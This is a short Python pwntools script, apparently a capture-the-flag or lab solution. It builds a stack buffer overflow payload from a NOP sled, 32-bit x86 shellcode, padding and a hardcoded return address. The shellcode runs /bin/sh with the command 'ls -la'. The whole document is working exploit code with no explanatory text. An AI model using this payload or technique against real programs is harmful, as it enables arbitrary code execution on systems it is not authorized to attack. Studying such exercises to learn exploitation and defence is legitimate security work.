import sys
from pwn import *

buffer_length = 200
stack_size = 244
shellcode = b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x6c\x73\x20\x2d\x6c\x61\x00\x57\x53\x89\xe1\xcd\x80'
buffer_addr = p32(0xffffd248)

payload = asm('nop') * (buffer_length - len(shellcode)) + shellcode + b'a' * (stack_size - buffer_length) + buffer_addr + b'\n' + b'\x00' * 2

sys.stdout.buffer.write(payload)
